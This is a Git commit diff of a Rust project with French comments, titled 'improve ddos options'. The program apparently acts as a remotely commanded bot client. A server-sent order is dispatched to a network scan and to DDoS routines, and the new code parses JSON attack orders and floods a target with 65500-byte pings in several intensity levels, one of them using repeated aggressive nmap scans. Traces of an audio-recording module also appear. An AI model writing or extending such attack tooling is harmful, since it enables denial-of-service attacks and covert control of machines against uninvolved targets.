d929ea9e8609dc1fb18c985b37c1052328f69bdd
Jiullian Ferreira <jiullian77470@gmail.com>
2024-01-14 18:39:54 +0100

    feat - improve ddos options

--- src/scenario.rs
+++ src/scenario.rs
@@ -1,3 +1,4 @@
+use std::sync::{Arc, Mutex};
 use std::thread;
 
 mod scan;
@@ -6,43 +7,26 @@ mod picture;
 mod record;
 
 pub(crate) fn ordre_du_srv(mut ordre: String) {
-    let args: Vec<&str> = ordre.split_whitespace().collect();
 
-    match args.get(0) {
-        Some(&"scan") => {
+    let shared_ordre = Arc::new(Mutex::new(ordre));
+
+        if shared_ordre.lock().unwrap().contains("scan") {
             println!("Lancement du scan réseau");
-            let t = thread::spawn(move || { scan::scan(scan::find_net()); });
-            t.join().expect("Le thread de scan a échoué");
-        },
-        Some(&"ddos") if (6..=15).contains(&args.get(1).map_or(0, |s| s.len())) => {
-            if let Ok(number) = args.get(2).unwrap_or(&"").parse::<i32>() {
-                println!("Lancement de l'attaque ddos avec {} threads", number);
-                let mut handles = Vec::new();
-
-                for _ in 0..number {
-                    let target = args[1].to_string();
-                    let handle = thread::spawn(move || { ddos::ping(target.clone()); });
-                    handles.push(handle);
-                }
-
-                for handle in handles {
-                    handle.join().expect("Un thread de ddos a échoué");
-                }
-            } else {
-                println!("Erreur : le nombre de threads n'est pas valide");
-            }
-        },
-        Some(&"picture") => {
-            println!("Cette option est en cours de développement :(");
-        },
-        Some(&"record") => {
-            println!("Lancement de l'enregistrement audio");
-            let t = thread::spawn(move || { record::record(); });
-            t.join().expect("Le thread d'enregistrement a échoué");
-        },
-        _ => {
-            println!("Commande non reconnue ou argument manquant");
+            let ordre_clone = Arc::clone(&shared_ordre);
+            let t = thread::spawn(move || {
+                scan::scan(scan::find_net(), ordre_clone.lock().unwrap().clone());
+            });
         }
+
+        if shared_ordre.lock().unwrap().contains("ddos") {
+            println!("Lancement de l'attaque ddos avancée");
+            let ordre_clone = Arc::clone(&shared_ordre);
+            let t = thread::spawn(move || {
+                ddos::ddos(ordre_clone.lock().unwrap().clone());
+            });
+        }
+
+        println!("{:?}", shared_ordre.lock().unwrap().as_str());
     }
-}
+
 
--- src/scenario/ddos.rs
+++ src/scenario/ddos.rs
@@ -1,11 +1,122 @@
+use std::process::Command;
+use std::thread;
+use serde::{Deserialize, Serialize};
 use crate::function_utils::subprocess_run;
-
 use crate::function_utils;
+
+
+// a copier coller pour le json
+#[derive(Serialize, Deserialize)]
+struct DataReceived {
+    id: String,
+    attack: String,
+    cible: String,
+    level:String,
+    threads:u32
+}
+fn receive_data_json_to_str(data: String) -> DataReceived {
+    let p = serde_json::from_str::<DataReceived>(&data).expect("Erreur JSON");
+    p
+}
+#[derive(Serialize, Deserialize)]
+struct DataSend {
+    id: u32,
+    attack: String,
+    ipup: Vec<String>
+}
+fn send_json_data(ips:Vec<String>, received:DataReceived){
+
+    let mut data = DataSend {
+        id: 0, // Remplacez par la valeur appropriée
+        attack: String::new(), // Remplacez par la valeur appropriée
+        ipup: Vec::new(),
+    };
+
+    //data.id = received.id;
+    //data.attack = received.attack;
+    //data.ipup = ips;
+
+    let json_string = serde_json::to_string(&data);
+
+    println!("Serialized JSON: {:?}", json_string)
+}
+
+// a copier coller pour le json
+
 
 pub(crate) fn ping(ip: String){
     let cmd= format!("ping {} -l 65500",ip);
 
     let sortie = subprocess_run(&*cmd);
+}
+
+pub(crate) fn check_ip(ip: String) -> bool {
+    let mut ip_split = ip.split(".");
+    let mut ip_split_vec_int: Vec<u32> = Vec::new();
+
+    for i in ip_split {
+        if let Ok(num) = i.parse::<u32>() {
+            if num >= 0 && num <= 254 {
+                ip_split_vec_int.push(num);
+            } else {
+                return false; // Si un numéro est en dehors de la plage, l'IP n'est pas valide
+            }
+        } else {
+            return false; // Si la conversion échoue, l'IP n'est pas valide
+        }
+    }
+
+    if ip_split_vec_int.len() == 4 {
+        return true;
+    }
+
+    false
+}
+
+pub(crate) fn ddos(ordre:String){
+
+    let data = receive_data_json_to_str(ordre);
+    let ip = check_ip(data.cible.clone());
+    if ip == false {
+        println!("L'ip n'est pas correcte");
+        return;
+    }else if ip == true {
+
+        println!("Lancement de l'attaque {} niveau {} sur {} avec {} threads.", data.attack, data.level, data.cible, data.threads);
+
+        if data.level == "1" {
+            //MODE : discret
+            for i in 0..data.threads {
+                let cmd = format!("ping {} -n 10 -l 65500", data.cible.clone());
+                let sortie = subprocess_run(&*cmd);
+                thread::sleep(std::time::Duration::from_millis(20000));
+            }
+            println!("Fin de l'attaque.")
+
+        }else if data.level == "2" {
+            //MODE : normal
+            for i in 0..data.threads {
+                let cmd = format!("ping {} -l 65500", data.cible.clone());
+                let sortie = subprocess_run(&*cmd);
+            }
+            println!("Fin de l'attaque.")
+        }else if data.level == "3" {
+            //MODE : avancé
+            for i in 0..data.threads {
+                let output = Command::new("nmap")
+                    .arg("-T5")
+                    .arg(data.cible.clone())
+                    .output()
+                    .expect("failed to execute process");
+            }
+            println!("Fin de l'attaque.")
+        }
+    }else {
+        println!("Erreur");
+    }
+
+
+
 }
 
 
